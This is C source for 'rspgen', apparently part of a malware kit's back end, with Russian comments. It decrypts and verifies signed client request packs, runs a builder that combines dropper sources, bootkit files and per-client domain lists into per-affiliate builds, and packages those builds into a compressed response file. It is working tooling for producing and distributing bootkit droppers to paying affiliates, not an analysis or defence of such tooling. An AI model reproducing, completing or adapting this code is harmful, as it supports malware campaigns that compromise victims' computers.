#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <memory.h>
#include <string.h>

#define RSPGEN_VERSION "0.6.8"

#include "../../../shared_code/platform.h"
#include "../../../shared_code/types.h"
#include "../../../shared_code/native.h"
#include "../../../shared_code/config.h"
#include "../../../shared_code/utils.h"
#include "../../../shared_code/havege.h"
#include "../../../shared_code/bignum.h"
#include "../../../shared_code/bn_mul.h"
#include "../../../shared_code/rsa.h"
#include "../../../shared_code/arc4.h"
#include "../../../shared_code/md5.h"
#include "../../../shared_code/sha1.h"
#include "../../../shared_code/arc4.h"
#include "../../../shared_code/crc64.h"
#include "../../../shared_code/lzma.h"


#define HASH_PADDING hash_padding

static const unsigned char hash_padding[64] =
{
    0x80, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
};

#include "../../../shared_code/arc4.c"
#define MPI_USE_FILE_IO 1
#define USE_STRING_IO 1
#define USE_STRING_WRITE_IO 1
#include "../../../shared_code/bignum.c"
#include "../../../shared_code/rsa.c"
#include "../../../shared_code/sha1.c"

#define USE_LZMA_COMPRESSOR 1
#include "../../../shared_code/lzma.c"

#include "../../../loader/mod_shared/pack_protect.h"

#pragma pack(push, 1)

typedef struct _request_file_header
{
    uint32_t subsCount;
    uint32_t clientId;
    char domens[1024];
} request_file_header_t, *prequest_file_header_t;

typedef struct _zr_header
{
    uint32_t signature;     // Сигнатура заголовка ('ZR79' ~ 0x3937525A).
    uint32_t groupsCount;   // Количество групп в файле.
} zr_header_t, *pzr_header_t;

typedef struct _group_header
{
    uint32_t filesCount;    // Количество файлов в группе.
    uint32_t affId;         // aff_id.
    uint32_t subId;         // sub_id.
} group_header_t, *pgroup_header_t;

typedef struct _file_header
{
    uint64_t fileCRC;  // CRC64 вычисленное по файлу.
    uint32_t fileSize; // Размер файла.
    char name[64];     // Имя файла в формате .
} file_header_t, *pfile_header_t;

#pragma pack(pop)

typedef struct cmd_options
{
    char* inPath;           // Путь файл для подписи.
    char* dropperPath;      // Путь с именем файла для сгенерированного пака.
    char* buildParams;      // Путь с именем файла для сгенерированного пака.
    char* bootkitPath;      // Путь к файлам буткита.
    char* outPath;          // Путь, где будет сохранён подписанный файл.
} cmd_options_t, *pcmd_options_t;

cmd_options_t gCmdOptions;

cmd_line_info_t cmdLineInfo = {5,
{
    {{"i", "in"}, "Path to input file", "Specify correct path to input file", OPT_FLAG_REQUIRED, TYPE_CMDLINE | TYPE_STRING, (void*)&gCmdOptions.inPath},
    {{"d" , "dropper"}, "Path to dropper sources", "", OPT_FLAG_OPTIONAL, TYPE_CMDLINE | TYPE_STRING, (void*)&gCmdOptions.dropperPath},
    {{"p" , "params"}, "Build parameters for dropper", "", OPT_FLAG_OPTIONAL, TYPE_CMDLINE | TYPE_STRING, (void*)&gCmdOptions.buildParams},
    {{"b" , "bootkit"}, "Path to bootkit files", "", OPT_FLAG_REQUIRED, TYPE_CMDLINE | TYPE_STRING, (void*)&gCmdOptions.bootkitPath},
    {{"o" , "out"}, "Path to output file", "", OPT_FLAG_REQUIRED, TYPE_CMDLINE | TYPE_STRING, (void*)&gCmdOptions.outPath},
}
};

int __cdecl main(int argc, char** argv)
{
    uint32_t i;
    int ret = EXIT_FAILURE;
    FILE* keyFile;
    rsa_context_t rsa;
    uint8_t hash[20];
    uint8_t realHash[20];
    uint8_t* fData = NULL;
    size_t fSize = 0;
    int err;
    psign_pack_header_t pSignPackHdr;
    char *ptr;
    char rootPath[MAX_PATH];
    char clientPath[MAX_PATH];
    char affidPath[MAX_PATH];
    char pubKeyPath[MAX_PATH];
    char commandLine[1024];
    char tmp[32];
    int hashSize = 0;
    prequest_file_header_t pReqFileHdr;
    uint32_t* affidList;
    uint8_t* zrPack = NULL;
    size_t zrPackSize;
    pzr_header_t pZrHdr;
    pgroup_header_t pGroupHdr;
    pfile_header_t pFileHdr;

    printf("\n--- rspgen ---\n\n");

    memset(&gCmdOptions, 0, sizeof(gCmdOptions));

    do {
        if (config_parse_cmdline(argc, argv, &cmdLineInfo, RSPGEN_VERSION) != 0) {
            break; 
        }

        printf("Checking file %s for existence... ", gCmdOptions.inPath);
        if (utils_is_file_exists(gCmdOptions.inPath) != ERR_OK) {
            printf("Failed\n  ! Not exists\n\n");
            break;
        }

        printf("OK\nReading file %s... ", gCmdOptions.inPath);
        if (utils_read_file(gCmdOptions.inPath, &fData, &fSize) != ERR_OK) {
            printf("Failed\n  ! Can't read from %s\n\n", gCmdOptions.inPath);
            break;
        }
        printf("OK\n");

        pSignPackHdr = (psign_pack_header_t)fData;

        GetModuleFileName(NULL, rootPath, MAX_PATH);
        
        ptr = rootPath + strlen(rootPath);
        // Получаем путь \bin.
        for ( ; *ptr != '\\' && *ptr != '/'; --ptr);
        // Получаем корень.
        *ptr = '\0';

        // Делаем текущей директорией путь, откуда запустились.
        if (utils_set_current_directory(rootPath) != ERR_OK) {
            printf("Failed\n  ! Can't set current directory\n\n");
            break;
        }

        ptr -=3;
        // Проверям нашу папку, если это не bin, то скорее всего нас запустиил не с той папки.
        if (_stricmp(ptr, "bin") != 0) {
            printf("Failed\n  ! Path of builder is incorrect\n\n");
            break;
        }

        *ptr = '\0';

        // Генерируем путь к папке клиента.
        strcpy_s(clientPath, MAX_PATH, rootPath);
        strcat_s(clientPath, MAX_PATH, "clients\\");
        // В параметре reserved1 находится идентификатор клиента.
        _itoa(pSignPackHdr->reserved1, tmp, 10);
        strcat_s(clientPath, MAX_PATH, tmp);
        strcat_s(clientPath, MAX_PATH, "\\");

        // Генерируем путь к файлу публичного ключа.
        strcpy_s(pubKeyPath, MAX_PATH, clientPath);
        strcat_s(pubKeyPath, MAX_PATH, "key.public");
        
        printf("OK\nChecking %s... ", pubKeyPath);
        if (utils_is_file_exists(pubKeyPath) != ERR_OK) {
            printf("Failed\n  ! Not exists\n\n");
            break;
        }

        printf("OK\nReading public key from %s... ", pubKeyPath);
        if ((keyFile = fopen(pubKeyPath, "rb")) == NULL) {
            printf("Failed\n  ! Could not open this file\n\n");
            break;
        }

        rsa_init(&rsa, RSA_PKCS_V15, 0);

        if ((err = mpi_read_file(&rsa.N , 16, keyFile)) != 0 ||
            (err = mpi_read_file(&rsa.E , 16, keyFile)) != 0)
        {
            printf( "Failed\n  ! Error %d while reading MPI number\n\n", err);
            break;
        }

        rsa.len = (mpi_msb(&rsa.N) + 7) >> 3;
        fclose(keyFile);

        // Дешифруем SHA-1 дайджест - ключ для дешифрования.
        err = rsa_public_decrypt_hash(&rsa, pSignPackHdr->sign, hash, &hashSize);
        if (err != ERR_OK || hashSize != 20) {
            printf( "Failed\n  ! Invalid public key\n\n", err);
            break;
        }

        // Расшифровываем тело пака...
        arc4_crypt_self(fData + sizeof(sign_pack_header_t), pSignPackHdr->sizeOfFile, hash, 20);

        // Подсчитываем SHA1 хеш...
        sha1(fData + sizeof(sign_pack_header_t), pSignPackHdr->sizeOfFile, realHash);

        if (memcmp(hash, realHash, 20) != 0) {
            printf( "Failed\n  ! Bad request file\n\n", err);
            break;
        }

        crc64_buildtable();

        pReqFileHdr = fData + sizeof(sign_pack_header_t);
        affidList = (uint32_t*)((uint8_t*)pReqFileHdr + sizeof(request_file_header_t));

        // Выделяем базовый буфер для файла-ответа.
        zrPackSize = sizeof(zr_header_t);
        zrPack = (uint8_t*)malloc(zrPackSize);
        pZrHdr = (pzr_header_t)zrPack;
        pZrHdr->signature = 0x3937525A;
        pZrHdr->groupsCount = pReqFileHdr->subsCount;        

        for (i = 0; i < pReqFileHdr->subsCount; ++i) {
            FILE* builderPipe;
            char answerbuf[1024];
            char *fData1, *fData2;
            size_t fSize1, fSize2;
            char fPath1[MAX_PATH], fPath2[MAX_PATH], fName1[64], fName2[64];
            uint32_t affId = affidList[2 * i];
            uint32_t subId = affidList[2 * i + 1];
            int firstReaded = 0;

            // Генерируем путь до папки аффида.
            strcpy_s(affidPath, MAX_PATH, clientPath);
            _itoa(affId, tmp, 10);
            strcat_s(affidPath, MAX_PATH, tmp);
            strcat_s(affidPath, MAX_PATH, "\\");

            // Проверяем существует ли папка с аффидом.
            printf("OK\nChecking %s... ", affidPath);
            if (utils_is_file_exists(affidPath) != ERR_OK) {
                // Если не существует, то создаём её и создаём необходимые файлыСоздаём папку с аффидом
                printf("Failed\n  ! Not exists\n\n");
                break;
            }

            // Генерируем команду, которая будет использоваться для встаривания конфига в mod_config.
            sprintf_s(commandLine, 1024, "builder.exe -m=1 -c=%u -a=%u -s=%u -v=\"*\" -d=\"%s\" -p=\"%s\" -b=\"%s\" -l=\"%s\"",
                pSignPackHdr->reserved1, affId, subId, gCmdOptions.dropperPath, gCmdOptions.buildParams, gCmdOptions.bootkitPath, pReqFileHdr->domens);

            printf("OK\n\nCommand: %s\n", commandLine);

            // Запускаем билдер и через pipe получаем пути к билдам.
            builderPipe = utils_plaunch(commandLine, "r");

            if (builderPipe == NULL) {
                printf("Failed\n  ! Builder pipe open error\n\n");
                break;
            }

            do {
                if (!fgets(answerbuf, 1024, builderPipe)) {
                    if (ferror(builderPipe)) {
                        utils_pdestroy(builderPipe);
                        printf("Failed\n  ! Builder pipe read error\n\n");
                        goto exit;
                    }
                    else {
                        answerbuf[0] = 0;	/* Hit EOF */
                    }
                }
    
                if (memcmp(answerbuf, "failed", strlen("failed")) == 0) {
                    printf("Failed\n  ! Builder returned with error\n\n");
                    goto exit;
                }
                else if (memcmp(answerbuf, "ok:", 3) == 0) {
                    char* fPath = answerbuf + 3;
                    if (fPath[strlen(fPath) - 1] == '\n') {
                        fPath[strlen(fPath) - 1] = '\0';
                        if (fPath[strlen(fPath) - 1] == '\r') {
                            fPath[strlen(fPath) - 1] = '\0';
                        }
                    }

                    if (!firstReaded) {
                        firstReaded = 1;
                        strcpy_s(fPath1, MAX_PATH, fPath);
                        if (utils_read_file(fPath, &fData1, &fSize1) != ERR_OK) {
                            printf("Failed\n  ! Can't read %s\n\n", fPath);
                            goto exit;
                        }

                        ptr = fPath1 + strlen(fPath1);
                        for ( ; *ptr != '\\' && *ptr != '/'; --ptr);
                        strcpy_s(fName1, 64, ptr + 1);
                    }
                    else {
                        uint8_t* tmpBlock;
                        firstReaded = 0;
                        strcpy_s(fPath2, MAX_PATH, fPath);
                        if (utils_read_file(fPath, &fData2, &fSize2) != ERR_OK) {
                            printf("Failed\n  ! Can't read %s\n\n", fPath);
                            goto exit;
                        }

                        ptr = fPath2 + strlen(fPath2);
                        for ( ; *ptr != '\\' && *ptr != '/'; --ptr);
                        strcpy_s(fName2, 64, ptr + 1);

                        tmpBlock = realloc(zrPack, zrPackSize + sizeof(group_header_t) + 2 * sizeof(file_header_t) + fSize1 + fSize2);
                        if (tmpBlock == NULL) {
                            printf("Failed\n  ! Can't allocate memory for response file buffer\n\n");
                            goto exit;
                        }

                        zrPack = tmpBlock;

                        pGroupHdr = zrPack + zrPackSize;
                        zrPackSize += sizeof(group_header_t) + 2 * sizeof(file_header_t) + fSize1 + fSize2;

                        pGroupHdr->filesCount = 2;
                        pGroupHdr->affId = affId;
                        pGroupHdr->subId = subId;
                        
                        pFileHdr = (uint8_t*)pGroupHdr + sizeof(group_header_t);
                        strcpy_s(pFileHdr->name, 64, fName1);
                        pFileHdr->fileSize = fSize1;
                        crc64_computate(fData1, fSize1, (uint32_t*)&pFileHdr->fileCRC);
                        memcpy((uint8_t*)pFileHdr + sizeof(file_header_t), fData1, fSize1);

                        pFileHdr = (uint8_t*)pFileHdr + sizeof(file_header_t) + fSize1;
                        strcpy_s(pFileHdr->name, 64, fName2);
                        pFileHdr->fileSize = fSize2;
                        crc64_computate(fData2, fSize2, (uint32_t*)&pFileHdr->fileCRC);
                        memcpy((uint8_t*)pFileHdr + sizeof(file_header_t), fData2, fSize2);
                    }
                }
                else if (answerbuf[0] != 0) {
                    printf("Failed\n  ! Output from builder was not recognized\n\n");
                    goto exit;
                }
            } while (answerbuf[0] != 0);
        }

        {
            uint8_t* outData;
            CLzmaEncProps props;
            size_t outSize;
            unsigned propsSize = LZMA_PROPS_SIZE;

            LzmaEncProps_Init(&props);
            props.dictSize = 1048576; // 1 MB
            outSize = zrPackSize + zrPackSize / 3 + 128 - LZMA_PROPS_SIZE;
            outData = malloc(outSize);

            if (LzmaEncode(&outData[LZMA_PROPS_SIZE], &outSize, zrPack, zrPackSize, &props, outData, &propsSize) != 0) {
                printf("Failed\n  ! Can't compress response file\n\n");
                goto exit;
            }

            zrPackSize = outSize + propsSize;

            if (utils_save_file(gCmdOptions.outPath, outData, zrPackSize) != ERR_OK) {
                printf("Failed\n  ! Can't save %s\n\n", gCmdOptions.outPath);
                goto exit;
            }
        }

        ret = EXIT_SUCCESS;
    } while (0);
exit:
    
    if (zrPack != NULL) {
        free(zrPack);
    }

    printf("\n--- rspgen ---\n");
    return ret;
}
